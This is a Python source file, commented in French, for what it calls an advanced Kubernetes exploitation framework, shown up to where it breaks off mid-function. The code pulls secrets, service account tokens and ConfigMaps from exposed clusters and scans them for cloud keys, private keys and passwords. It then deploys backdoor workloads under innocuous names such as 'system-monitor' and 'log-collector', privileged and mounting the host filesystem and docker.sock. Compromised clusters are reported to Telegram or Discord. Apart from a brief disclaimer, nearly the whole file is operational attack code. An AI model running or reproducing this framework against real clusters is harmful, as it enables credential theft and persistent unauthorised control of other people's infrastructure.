#!/usr/bin/env python3
"""
WWYVQV5 - Advanced Kubernetes Exploitation Framework 
TOUTES LES PHASES IMPLÉMENTÉES - Version Complète

Author: wKayaa  
Date: 2025-06-23 20:36:32 UTC
Status: PRODUCTION READY 🚀

⚠️  AVERTISSEMENT: Framework d'exploitation à des fins de test de sécurité uniquement
    Utilisez uniquement dans des environnements autorisés et légaux
"""

import asyncio
import aiohttp
import json
import base64
import jwt
import csv
import logging
import yaml
import os
import sys
import subprocess
import time
import hashlib
import uuid
import ssl
import socket
import tempfile
import shutil
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from enum import Enum
from pathlib import Path
from urllib.parse import urlparse, urljoin
import concurrent.futures
from collections import defaultdict
import re
import random
import string

# Imports pour les intégrations
try:
    import requests
    import docker
    from kubernetes import client, config
    from flask import Flask, render_template, jsonify, request
    import telebot
    import discord
    from discord.ext import commands
    HAS_INTEGRATIONS = True
except ImportError:
    HAS_INTEGRATIONS = False
    print("⚠️  Certaines dépendances manquantes - fonctionnalités réduites")

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 CONFIGURATION GLOBALE & TYPES
# ═══════════════════════════════════════════════════════════════════════════════

class ExploitationMode(Enum):
    """Modes d'exploitation configurables"""
    PASSIVE = "passive"          # Détection uniquement
    ACTIVE = "active"            # Exploitation standard
    AGGRESSIVE = "aggressive"    # Persistance + lateral movement
    STEALTH = "stealth"         # Exploitation furtive
    DESTRUCTIVE = "destructive" # Tests destructifs (lab uniquement)

class ClusterStatus(Enum):
    """Statuts de compromission des clusters"""
    DETECTED = "detected"
    ACCESSIBLE = "accessible"
    COMPROMISED = "compromised"
    PERSISTENT = "persistent"
    FAILED = "failed"

class ThreatLevel(Enum):
    """Niveaux de menace"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class KubernetesSecret:
    """Structure pour stocker les secrets extraits"""
    name: str
    namespace: str
    type: str
    data: Dict[str, str]
    decoded_data: Dict[str, str]
    metadata: Dict
    cluster_endpoint: str
    extraction_time: str
    is_sensitive: bool = False
    credential_type: Optional[str] = None
    threat_level: ThreatLevel = ThreatLevel.LOW
    aws_keys: List[str] = field(default_factory=list)
    gcp_keys: List[str] = field(default_factory=list)
    azure_keys: List[str] = field(default_factory=list)

@dataclass
class ServiceAccountToken:
    """Structure pour les tokens de service accounts"""
    name: str
    namespace: str
    token: str
    decoded_payload: Dict
    permissions: List[str]
    cluster_endpoint: str
    is_cluster_admin: bool = False
    expiry: Optional[datetime] = None
    can_create_pods: bool = False
    can_read_secrets: bool = False
    can_escalate: bool = False

@dataclass
class MaliciousPod:
    """Structure pour pods malveillants déployés"""
    name: str
    namespace: str
    image: str
    privileged: bool
    host_network: bool
    host_pid: bool
    volumes_mounted: List[str]
    capabilities: List[str]
    cluster_endpoint: str
    deployment_time: str
    backdoor_port: Optional[int] = None
    persistence_method: str = ""
    status: str = "pending"

@dataclass
class CompromisedCluster:
    """Structure pour clusters compromis"""
    endpoint: str
    status: ClusterStatus
    version: Optional[str]
    distribution: Optional[str]  # EKS, GKE, AKS, vanilla, etc.
    nodes: List[Dict]
    namespaces: List[str]
    secrets_count: int
    secrets: List[KubernetesSecret]
    service_accounts: List[ServiceAccountToken]
    pods_deployed: List[MaliciousPod]
    backdoors: List[Dict]
    persistence_mechanisms: List[str]
    compromise_time: str
    last_activity: str
    exfiltrated_data_size: int = 0
    vulnerability_score: float = 0.0
    threat_level: ThreatLevel = ThreatLevel.LOW
    admin_access: bool = False
    network_policies: List[Dict] = field(default_factory=list)
    rbac_policies: List[Dict] = field(default_factory=list)

@dataclass
class ExploitationConfig:
    """Configuration d'exploitation"""
    mode: ExploitationMode
    max_pods_per_cluster: int = 5
    max_concurrent_clusters: int = 10
    timeout_per_operation: int = 30
    cleanup_on_exit: bool = True
    maintain_access: bool = True
    stealth_mode: bool = False
    export_credentials: bool = True
    telegram_alerts: bool = False
    discord_alerts: bool = False
    auto_escalate: bool = False
    deploy_persistence: bool = False
    lateral_movement: bool = False
    data_exfiltration: bool = False
    validate_lab_env: bool = True

# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 CLASSE PRINCIPALE - KUBERNETES EXPLOITATION FRAMEWORK
# ═══════════════════════════════════════════════════════════════════════════════

class KubernetesAdvancedExploitation:
    """Framework complet d'exploitation Kubernetes automatisée"""
    
    def __init__(self, config: ExploitationConfig):
        self.config = config
        self.compromised_clusters: Dict[str, CompromisedCluster] = {}
        self.all_secrets: List[KubernetesSecret] = []
        self.all_tokens: List[ServiceAccountToken] = []
        self.exploitation_log: List[Dict] = []
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = datetime.utcnow()
        
        # Configuration des chemins
        self.output_dir = Path(f"exploitation_results_{self.session_id}")
        self.output_dir.mkdir(exist_ok=True)
        
        # Configuration du logging
        self._setup_logging()
        
        # Listes des payloads et techniques
        self._init_payloads()
        
        # Stats globales
        self.stats = {
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0,
            "pods_deployed": 0,
            "persistence_established": 0,
            "data_exfiltrated": 0
        }
        
        self.logger.info(f"🚀 Kubernetes Advanced Exploitation Framework initialisé")
        self.logger.info(f"📊 Mode: {config.mode.value} | Session: {self.session_id}")

    def _setup_logging(self):
        """Configuration du système de logging"""
        self.logger = logging.getLogger(f"K8sExploit_{self.session_id}")
        self.logger.setLevel(logging.INFO)
        
        # Handler pour fichier
        fh = logging.FileHandler(self.output_dir / "exploitation.log")
        fh.setLevel(logging.DEBUG)
        
        # Handler pour console
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Format
        formatter = logging.Formatter(
            '%(asctime)s | %(name)s | %(levelname)s | %(message)s'
        )
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)

    def _init_payloads(self):
        """Initialisation des payloads et techniques d'exploitation"""
        
        # Images malveillantes pour pods
        self.malicious_images = [
            "alpine:latest",
            "busybox:latest", 
            "ubuntu:latest",
            "nginx:alpine",
            "python:3.9-alpine"
        ]
        
        # Techniques d'évasion de conteneur
        self.container_escape_techniques = [
            "docker_socket_mount",
            "host_filesystem_mount", 
            "privileged_container",
            "host_network_namespace",
            "host_pid_namespace",
            "proc_mount_escape",
            "cgroup_release_agent"
        ]
        
        # Mécanismes de persistance
        self.persistence_mechanisms = [
            "malicious_daemonset",
            "webhook_admission_controller",
            "cronjob_backdoor",
            "mutating_webhook",
            "custom_resource_definitions",
            "rbac_modification",
            "service_account_creation",
            "secret_injection"
        ]
        
        # Patterns de secrets sensibles
        self.sensitive_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[0-9a-zA-Z/+=]{40}',
            'gcp_service_account': r'"type": "service_account"',
            'azure_client_secret': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'private_key': r'-----BEGIN [A-Z ]+PRIVATE KEY-----',
            'api_key': r'[Aa][Pp][Ii]_?[Kk][Ee][Yy].*[0-9a-f]{32,64}',
            'password': r'[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd].*[=:]\s*[^\s]+',
            'database_url': r'(mysql|postgresql|mongodb)://[^\s]+',
            'redis_url': r'redis://[^\s]+'
        }

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 PHASE 1: FONDATIONS D'EXPLOITATION 
    # ═══════════════════════════════════════════════════════════════════════════════

    async def exploit_cluster(self, session: aiohttp.ClientSession, target: str, base_url: str):
        """Point d'entrée principal pour l'exploitation d'un cluster"""
        try:
            self.stats["clusters_scanned"] += 1
            cluster_info = CompromisedCluster(
                endpoint=base_url,
                status=ClusterStatus.DETECTED,
                version=None,
                distribution=None,
                nodes=[],
                namespaces=[],
                secrets_count=0,
                secrets=[],
                service_accounts=[],
                pods_deployed=[],
                backdoors=[],
                persistence_mechanisms=[],
                compromise_time=datetime.utcnow().isoformat(),
                last_activity=datetime.utcnow().isoformat()
            )
            
            self.logger.info(f"🎯 Début d'exploitation: {base_url}")
            
            # Phase 1.1: Auto-dump des secrets
            await self._auto_dump_secrets(session, base_url, cluster_info)
            
            # Phase 1.2: Extraction des tokens de service accounts
            await self._extract_service_account_tokens(session, base_url, cluster_info)
            
            # Phase 1.3: Dump des ConfigMaps sensibles
            await self._dump_configmaps_sensitive(session, base_url, cluster_info)
            
            # Évaluation des permissions et escalade si possible
            await self._evaluate_permissions(session, base_url, cluster_info)
            
            # Si mode actif ou agressif, déploiement d'exploits
            if self.config.mode in [ExploitationMode.ACTIVE, ExploitationMode.AGGRESSIVE]:
                await self._deploy_exploitation_phase(session, base_url, cluster_info)
            
            # Si mode agressif, persistance et mouvement latéral
            if self.config.mode == ExploitationMode.AGGRESSIVE:
                await self._advanced_persistence_phase(session, base_url, cluster_info)
                await self._lateral_movement_phase(session, base_url, cluster_info)
            
            # Mise à jour des stats finales
            self._update_cluster_stats(cluster_info)
            self.compromised_clusters[base_url] = cluster_info
            
            if cluster_info.status != ClusterStatus.FAILED:
                self.stats["clusters_compromised"] += 1
                self.logger.info(f"✅ Cluster compromis: {base_url} | Statut: {cluster_info.status.value}")
                
                # Alertes si configurées
                if self.config.telegram_alerts or self.config.discord_alerts:
                    await self._send_compromise_alerts(cluster_info)
            
            return cluster_info
            
        except Exception as e:
            self.logger.error(f"❌ Erreur lors de l'exploitation de {base_url}: {str(e)}")
            cluster_info.status = ClusterStatus.FAILED
            return cluster_info

    async def _auto_dump_secrets(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Sprint 1.1: Dump automatique de tous les secrets Kubernetes"""
        self.logger.info(f"🔍 Phase 1.1: Auto-dump des secrets - {base_url}")
        
        endpoints_to_try = [
            "/api/v1/secrets",
            "/api/v1/namespaces/default/secrets",
            "/api/v1/namespaces/kube-system/secrets",
            "/api/v1/namespaces/kube-public/secrets",
            "/apis/v1/secrets"
        ]
        
        for endpoint in endpoints_to_try:
            try:
                url = urljoin(base_url, endpoint)
                self.logger.debug(f"🔎 Tentative: {url}")
                
                async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                    if response.status == 200:
                        data = await response.json()
                        await self._process_secrets_response(data, base_url, cluster_info)
                    elif response.status == 401:
                        self.logger.warning(f"🔐 Accès refusé pour {endpoint}")
                    elif response.status == 403:
                        self.logger.warning(f"🚫 Permissions insuffisantes pour {endpoint}")
                        
            except asyncio.TimeoutError:
                self.logger.warning(f"⏰ Timeout pour {endpoint}")
            except Exception as e:
                self.logger.debug(f"❌ Erreur {endpoint}: {str(e)}")
        
        # Tentative d'accès aux secrets via namespaces découverts
        if cluster_info.namespaces:
            await self._dump_secrets_all_namespaces(session, base_url, cluster_info)

    async def _process_secrets_response(self, data: Dict, base_url: str, cluster_info: CompromisedCluster):
        """Traitement des réponses contenant des secrets"""
        if not isinstance(data, dict) or 'items' not in data:
            return
            
        secrets_found = 0
        for item in data.get('items', []):
            try:
                secret = await self._extract_secret_data(item, base_url)
                if secret:
                    cluster_info.secrets.append(secret)
                    self.all_secrets.append(secret)
                    secrets_found += 1
                    
                    if secret.is_sensitive:
                        self.logger.warning(f"🚨 Secret sensible trouvé: {secret.name} ({secret.credential_type})")
                    
            except Exception as e:
                self.logger.debug(f"❌ Erreur traitement secret: {str(e)}")
        
        cluster_info.secrets_count += secrets_found
        self.stats["secrets_extracted"] += secrets_found
        
        if secrets_found > 0:
            self.logger.info(f"💾 {secrets_found} secrets extraits de {base_url}")
            cluster_info.status = ClusterStatus.ACCESSIBLE

    async def _extract_secret_data(self, secret_item: Dict, base_url: str) -> Optional[KubernetesSecret]:
        """Extraction et décodage des données d'un secret"""
        try:
            metadata = secret_item.get('metadata', {})
            name = metadata.get('name', 'unknown')
            namespace = metadata.get('namespace', 'default')
            secret_type = secret_item.get('type', 'Opaque')
            raw_data = secret_item.get('data', {})
            
            # Décodage base64 des données
            decoded_data = {}
            for key, value in raw_data.items():
                try:
                    if isinstance(value, str):
                        decoded_data[key] = base64.b64decode(value).decode('utf-8', errors='ignore')
                    else:
                        decoded_data[key] = str(value)
                except Exception:
                    decoded_data[key] = str(value)
            
            secret = KubernetesSecret(
                name=name,
                namespace=namespace,
                type=secret_type,
                data=raw_data,
                decoded_data=decoded_data,
                metadata=metadata,
                cluster_endpoint=base_url,
                extraction_time=datetime.utcnow().isoformat()
            )
            
            # Analyse de la sensibilité
            await self._analyze_secret_sensitivity(secret)
            
            return secret
            
        except Exception as e:
            self.logger.debug(f"❌ Erreur extraction secret: {str(e)}")
            return None

    async def _analyze_secret_sensitivity(self, secret: KubernetesSecret):
        """Analyse de la sensibilité d'un secret"""
        sensitive_indicators = 0
        
        # Analyse des patterns dans les données décodées
        all_text = " ".join(secret.decoded_data.values()).lower()
        
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, all_text, re.IGNORECASE)
            if matches:
                sensitive_indicators += len(matches)
                secret.is_sensitive = True
                
                if pattern_name.startswith('aws'):
                    secret.aws_keys.extend(matches)
                    secret.credential_type = "AWS"
                elif pattern_name.startswith('gcp'):
                    secret.gcp_keys.extend(matches)
                    secret.credential_type = "GCP"
                elif pattern_name.startswith('azure'):
                    secret.azure_keys.extend(matches)
                    secret.credential_type = "Azure"
                elif pattern_name == 'jwt_token':
                    secret.credential_type = "JWT"
                elif pattern_name == 'private_key':
                    secret.credential_type = "Private Key"
        
        # Analyse du type de secret
        if secret.type in ['kubernetes.io/service-account-token', 'kubernetes.io/dockercfg']:
            secret.is_sensitive = True
            sensitive_indicators += 3
            if not secret.credential_type:
                secret.credential_type = "Service Account"
        
        # Évaluation du niveau de menace
        if sensitive_indicators >= 5:
            secret.threat_level = ThreatLevel.CRITICAL
        elif sensitive_indicators >= 3:
            secret.threat_level = ThreatLevel.HIGH
        elif sensitive_indicators >= 1:
            secret.threat_level = ThreatLevel.MEDIUM
        else:
            secret.threat_level = ThreatLevel.LOW

    async def _extract_service_account_tokens(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Sprint 1.1: Extraction des tokens de service accounts"""
        self.logger.info(f"🎫 Phase 1.1: Extraction des tokens de service accounts - {base_url}")
        
        endpoints_to_try = [
            "/api/v1/serviceaccounts",
            "/api/v1/namespaces/default/serviceaccounts",
            "/api/v1/namespaces/kube-system/serviceaccounts"
        ]
        
        for endpoint in endpoints_to_try:
            try:
                url = urljoin(base_url, endpoint)
                async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                    if response.status == 200:
                        data = await response.json()
                        await self._process_service_accounts(session, data, base_url, cluster_info)
                        
            except Exception as e:
                self.logger.debug(f"❌ Erreur service accounts {endpoint}: {str(e)}")
        
        # Extraction des tokens depuis les secrets de type service-account-token
        for secret in cluster_info.secrets:
            if secret.type == 'kubernetes.io/service-account-token':
                await self._extract_token_from_secret(secret, cluster_info)

    async def _process_service_accounts(self, session: aiohttp.ClientSession, data: Dict, base_url: str, cluster_info: CompromisedCluster):
        """Traitement des service accounts trouvés"""
        if not isinstance(data, dict) or 'items' not in data:
            return
            
        for item in data.get('items', []):
            try:
                metadata = item.get('metadata', {})
                name = metadata.get('name', 'unknown')
                namespace = metadata.get('namespace', 'default')
                
                # Récupération du token associé
                await self._get_service_account_token(session, name, namespace, base_url, cluster_info)
                
            except Exception as e:
                self.logger.debug(f"❌ Erreur traitement service account: {str(e)}")

    async def _get_service_account_token(self, session: aiohttp.ClientSession, sa_name: str, namespace: str, base_url: str, cluster_info: CompromisedCluster):
        """Récupération du token d'un service account spécifique"""
        try:
            # Recherche du secret associé au service account
            url = urljoin(base_url, f"/api/v1/namespaces/{namespace}/secrets")
            async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                if response.status == 200:
                    data = await response.json()
                    for secret_item in data.get('items', []):
                        annotations = secret_item.get('metadata', {}).get('annotations', {})
                        if annotations.get('kubernetes.io/service-account.name') == sa_name:
                            secret = await self._extract_secret_data(secret_item, base_url)
                            if secret:
                                await self._extract_token_from_secret(secret, cluster_info)
                                
        except Exception as e:
            self.logger.debug(f"❌ Erreur récupération token {sa_name}: {str(e)}")

    async def _extract_token_from_secret(self, secret: KubernetesSecret, cluster_info: CompromisedCluster):
        """Extraction et analyse d'un token depuis un secret"""
        try:
            token_data = secret.decoded_data.get('token', '')
            if not token_data:
                return
            
            # Décodage du JWT
            try:
                decoded_payload = jwt.decode(token_data, options={"verify_signature": False})
            except Exception:
                # Si ce n'est pas un JWT valide, on garde quand même le token
                decoded_payload = {}
            
            # Création de l'objet ServiceAccountToken
            sa_token = ServiceAccountToken(
                name=secret.name,
                namespace=secret.namespace,
                token=token_data,
                decoded_payload=decoded_payload,
                permissions=[],
                cluster_endpoint=cluster_info.endpoint
            )
            
            # Analyse des permissions
            await self._analyze_token_permissions(sa_token, cluster_info)
            
            cluster_info.service_accounts.append(sa_token)
            self.all_tokens.append(sa_token)
            
            if sa_token.is_cluster_admin:
                self.logger.warning(f"🚨 Token cluster-admin trouvé: {sa_token.name}")
                cluster_info.admin_access = True
            
        except Exception as e:
            self.logger.debug(f"❌ Erreur extraction token: {str(e)}")

    async def _analyze_token_permissions(self, token: ServiceAccountToken, cluster_info: CompromisedCluster):
        """Analyse des permissions d'un token"""
        try:
            # Analyse du payload JWT
            if 'kubernetes.io' in token.decoded_payload:
                k8s_info = token.decoded_payload['kubernetes.io']
                if isinstance(k8s_info, dict):
                    serviceaccount = k8s_info.get('serviceaccount', {})
                    if serviceaccount.get('name') == 'cluster-admin':
                        token.is_cluster_admin = True
            
            # Test des permissions via l'API si possible
            # TODO: Implémenter des tests de permissions réels
            
            # Heuristiques basées sur le nom
            if any(term in token.name.lower() for term in ['admin', 'cluster-admin', 'system']):
                token.is_cluster_admin = True
                token.can_create_pods = True
                token.can_read_secrets = True
                token.can_escalate = True
            
        except Exception as e:
            self.logger.debug(f"❌ Erreur analyse permissions: {str(e)}")

    async def _dump_configmaps_sensitive(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Sprint 1.1: Dump des ConfigMaps contenant des données sensibles"""
        self.logger.info(f"📋 Phase 1.1: Dump des ConfigMaps sensibles - {base_url}")
        
        endpoints_to_try = [
            "/api/v1/configmaps",
            "/api/v1/namespaces/default/configmaps",
            "/api/v1/namespaces/kube-system/configmaps"
        ]
        
        for endpoint in endpoints_to_try:
            try:
                url = urljoin(base_url, endpoint)
                async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                    if response.status == 200:
                        data = await response.json()
                        await self._process_configmaps(data, base_url, cluster_info)
                        
            except Exception as e:
                self.logger.debug(f"❌ Erreur configmaps {endpoint}: {str(e)}")

    async def _process_configmaps(self, data: Dict, base_url: str, cluster_info: CompromisedCluster):
        """Traitement des ConfigMaps trouvées"""
        if not isinstance(data, dict) or 'items' not in data:
            return
            
        sensitive_configs = 0
        for item in data.get('items', []):
            try:
                metadata = item.get('metadata', {})
                name = metadata.get('name', 'unknown')
                namespace = metadata.get('namespace', 'default')
                config_data = item.get('data', {})
                
                # Analyse de la sensibilité des données
                is_sensitive = await self._analyze_configmap_sensitivity(config_data)
                
                if is_sensitive:
                    sensitive_configs += 1
                    self.logger.warning(f"🚨 ConfigMap sensible: {namespace}/{name}")
                    
                    # Stockage comme "secret" pour traitement unifié
                    fake_secret = KubernetesSecret(
                        name=f"configmap-{name}",
                        namespace=namespace,
                        type="ConfigMap",
                        data=config_data,
                        decoded_data=config_data,
                        metadata=metadata,
                        cluster_endpoint=base_url,
                        extraction_time=datetime.utcnow().isoformat(),
                        is_sensitive=True,
                        credential_type="ConfigMap"
                    )
                    
                    cluster_info.secrets.append(fake_secret)
                    self.all_secrets.append(fake_secret)
                    
            except Exception as e:
                self.logger.debug(f"❌ Erreur traitement configmap: {str(e)}")
        
        if sensitive_configs > 0:
            self.logger.info(f"📋 {sensitive_configs} ConfigMaps sensibles trouvées")

    async def _analyze_configmap_sensitivity(self, config_data: Dict) -> bool:
        """Analyse de la sensibilité d'une ConfigMap"""
        if not config_data:
            return False
            
        all_text = " ".join(str(v) for v in config_data.values()).lower()
        
        # Patterns de données sensibles dans les ConfigMaps
        sensitive_keywords = [
            'password', 'passwd', 'secret', 'key', 'token', 'api_key',
            'database_url', 'db_password', 'mysql', 'postgresql',
            'redis', 'mongodb', 'elasticsearch', 'aws_access',
            'gcp_key', 'azure_client', 'docker_password'
        ]
        
        for keyword in sensitive_keywords:
            if keyword in all_text:
                return True
        
        # Patterns regex
        for pattern in self.sensitive_patterns.values():
            if re.search(pattern, all_text, re.IGNORECASE):
                return True
                
        return False

    async def _dump_secrets_all_namespaces(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Dump des secrets dans tous les namespaces découverts"""
        for namespace in cluster_info.namespaces:
            try:
                url = urljoin(base_url, f"/api/v1/namespaces/{namespace}/secrets")
                async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                    if response.status == 200:
                        data = await response.json()
                        await self._process_secrets_response(data, base_url, cluster_info)
                        
            except Exception as e:
                self.logger.debug(f"❌ Erreur secrets namespace {namespace}: {str(e)}")

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 PHASE 1.2: PODS MALVEILLANTS PERSISTANTS
    # ═══════════════════════════════════════════════════════════════════════════════

    async def _deploy_exploitation_phase(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Phase de déploiement d'exploits actifs"""
        self.logger.info(f"🚀 Phase 1.2: Déploiement d'exploits actifs - {base_url}")
        
        # Vérification des permissions avant déploiement
        if not await self._can_deploy_pods(session, base_url, cluster_info):
            self.logger.warning(f"⚠️ Permissions insuffisantes pour déployer des pods")
            return
        
        # Déploiement de pods malveillants
        await self._deploy_persistent_backdoor(session, base_url, cluster_info)
        
        # Création de service accounts privilégiés
        await self._create_persistent_service_account(session, base_url, cluster_info)
        
        # Techniques d'évasion de conteneur
        await self._container_escape_techniques(session, base_url, cluster_info)

    async def _can_deploy_pods(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster) -> bool:
        """Vérification des permissions pour déployer des pods"""
        try:
            # Test simple de création de pod
            test_url = urljoin(base_url, "/api/v1/namespaces/default/pods")
            test_pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {"name": "test-permissions"},
                "spec": {
                    "containers": [{
                        "name": "test",
                        "image": "alpine:latest",
                        "command": ["sleep", "10"]
                    }]
                }
            }
            
            async with session.post(test_url, json=test_pod, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 201]:
                    # Nettoyage immédiat
                    delete_url = f"{test_url}/test-permissions"
                    await session.delete(delete_url)
                    return True
                    
        except Exception:
            pass
            
        return False

    async def _deploy_persistent_backdoor(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Déploiement de pods backdoor persistants"""
        self.logger.info(f"🕳️ Déploiement de backdoors persistants")
        
        backdoor_configs = [
            self._get_privileged_pod_config(),
            self._get_host_network_pod_config(),
            self._get_daemonset_config(),
            self._get_cronjob_backdoor_config()
        ]
        
        for config in backdoor_configs:
            try:
                if await self._deploy_malicious_workload(session, base_url, config, cluster_info):
                    self.stats["pods_deployed"] += 1
                    
            except Exception as e:
                self.logger.debug(f"❌ Erreur déploiement backdoor: {str(e)}")

    def _get_privileged_pod_config(self) -> Dict:
        """Configuration d'un pod privilégié avec accès à l'hôte"""
        return {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": f"system-monitor-{self.session_id[:6]}",
                "namespace": "kube-system",
                "labels": {"app": "system-monitor"}
            },
            "spec": {
                "hostNetwork": True,
                "hostPID": True,
                "containers": [{
                    "name": "monitor",
                    "image": random.choice(self.malicious_images),
                    "command": ["/bin/sh"],
                    "args": ["-c", "while true; do sleep 3600; done"],
                    "securityContext": {
                        "privileged": True,
                        "capabilities": {"add": ["SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE"]}
                    },
                    "volumeMounts": [
                        {"name": "host-root", "mountPath": "/host", "readOnly": False},
                        {"name": "docker-sock", "mountPath": "/var/run/docker.sock"}
                    ]
                }],
                "volumes": [
                    {"name": "host-root", "hostPath": {"path": "/"}},
                    {"name": "docker-sock", "hostPath": {"path": "/var/run/docker.sock"}}
                ]
            }
        }

    def _get_host_network_pod_config(self) -> Dict:
        """Configuration d'un pod avec accès réseau hôte"""
        return {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": f"network-debug-{self.session_id[:6]}",
                "namespace": "default"
            },
            "spec": {
                "hostNetwork": True,
                "containers": [{
                    "name": "netdebug",
                    "image": "alpine:latest",
                    "command": ["/bin/sh"],
                    "args": ["-c", "apk add --no-cache nmap netcat-openbsd && while true; do sleep 3600; done"],
                    "securityContext": {"privileged": True}
                }]
            }
        }

    def _get_daemonset_config(self) -> Dict:
        """Configuration d'un DaemonSet pour persistance sur tous les nœuds"""
        return {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "metadata": {
                "name": f"log-collector-{self.session_id[:6]}",
                "namespace": "kube-system"
            },
            "spec": {
                "selector": {"matchLabels": {"app": "log-collector"}},
                "template": {
                    "metadata": {"labels": {"app": "log-collector"}},
                    "spec": {
                        "hostNetwork": True,
                        "containers": [{
                            "name": "collector",
                            "image": "busybox:latest",
                            "command": ["/bin/sh"],
                            "args": ["-c", "while true; do sleep 3600; done"],
                            "securityContext": {"privileged": True},
                            "volumeMounts": [
                                {"name": "host-logs", "mountPath": "/var/log/host", "readOnly": True}
                            ]
                        }],
                        "volumes": [
                            {"name": "host-logs", "hostPath": {"path": "/var/log"}}
                        ]
                    }
                }
            }
        }

    def _get_cronjob_backdoor_config(self) -> Dict:
        """Configuration d'un CronJob pour maintenir l'accès"""
        return {
            "apiVersion": "batch/v1",
            "kind": "CronJob",
            "metadata": {
                "name": f"cleanup-job-{self.session_id[:6]}",
                "namespace": "kube-system"
            },
            "spec": {
                "schedule": "*/30 * * * *",  # Toutes les 30 minutes
                "jobTemplate": {
                    "spec": {
                        "template": {
                            "spec": {
                                "containers": [{
                                    "name": "cleanup",
                                    "image": "alpine:latest",
                                    "command": ["/bin/sh"],
                                    "args": ["-c", "echo 'Maintenance completed' && sleep 60"]
                                }],
                                "restartPolicy": "OnFailure"
                            }
                        }
                    }
                }
            }
        }

    async def _deploy_malicious_workload(self, session: aiohttp.ClientSession, base_url: str, config: Dict, cluster_info: CompromisedCluster) -> bool:
        """Déploiement d'une charge de travail malveillante"""
        try:
            kind = config.get("kind", "Pod")
            namespace = config.get("metadata", {}).get("namespace", "default")
            name = config.get("metadata", {}).get("name", "unknown")
            
            # Sélection de l'endpoint approprié
            if kind == "Pod":
                endpoint = f"/api/v1/namespaces/{namespace}/pods"
            elif kind == "DaemonSet":
                endpoint = f"/apis/apps/v1/namespaces/{namespace}/daemonsets"
            elif kind == "CronJob":
                endpoint = f"/apis/batch/v1/namespaces/{namespace}/cronjobs"
            else:
                endpoint = f"/api/v1/namespaces/{namespace}/pods"
            
            url = urljoin(base_url, endpoint)
            
            async with session.post(url, json=config, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 201]:
                    self.logger.info(f"✅ {kind} déployé: {namespace}/{name}")
                    
                    # Création de l'objet MaliciousPod
                    malicious_pod = MaliciousPod(
                        name=name,
                        namespace=namespace,
                        image=config.get("spec", {}).get("containers", [{}])[0].get("image", "unknown"),
                        privileged=True,
                        host_network=config.get("spec", {}).get("hostNetwork", False),
                        host_pid=config.get("spec", {}).get("hostPID", False),
                        volumes_mounted=[],
                        capabilities=[],
                        cluster_endpoint=base_url,
                        deployment_time=datetime.utcnow().isoformat(),
                        status="deployed"
                    )
                    
                    cluster_info.pods_deployed.append(malicious_pod)
                    return True
                else:
                    self.logger.warning(f"❌ Échec déploiement {kind}: {response.status}")
                    return False
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur déploiement workload: {str(e)}")
            return False

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 PHASE 2: LATERAL MOVEMENT & PERSISTENCE AVANCÉE
    # ═══════════════════════════════════════════════════════════════════════════════

    async def _advanced_persistence_phase(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Phase de persistance avancée"""
        self.logger.info(f"🔒 Phase 2: Persistance avancée - {base_url}")
        
        # Mécanismes de persistance avancés
        await self._deploy_webhook_backdoors(session, base_url, cluster_info)
        await self._create_malicious_crds(session, base_url, cluster_info)
        await self._modify_rbac_policies(session, base_url, cluster_info)
        await self._deploy_malicious_operators(session, base_url, cluster_info)

    async def _deploy_webhook_backdoors(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Déploiement de webhooks d'admission malveillants"""
        self.logger.info(f"🪝 Déploiement de webhooks backdoor")
        
        webhook_config = {
            "apiVersion": "admissionregistration.k8s.io/v1",
            "kind": "MutatingAdmissionWebhook",
            "metadata": {
                "name": f"pod-security-{self.session_id[:6]}"
            },
            "webhooks": [{
                "name": "pod-security.example.com",
                "clientConfig": {
                    "service": {
                        "name": "webhook-service",
                        "namespace": "kube-system",
                        "path": "/mutate"
                    }
                },
                "rules": [{
                    "operations": ["CREATE"],
                    "apiGroups": [""],
                    "apiVersions": ["v1"],
                    "resources": ["pods"]
                }],
                "admissionReviewVersions": ["v1", "v1beta1"]
            }]
        }
        
        try:
            url = urljoin(base_url, "/apis/admissionregistration.k8s.io/v1/mutatingadmissionwebhooks")
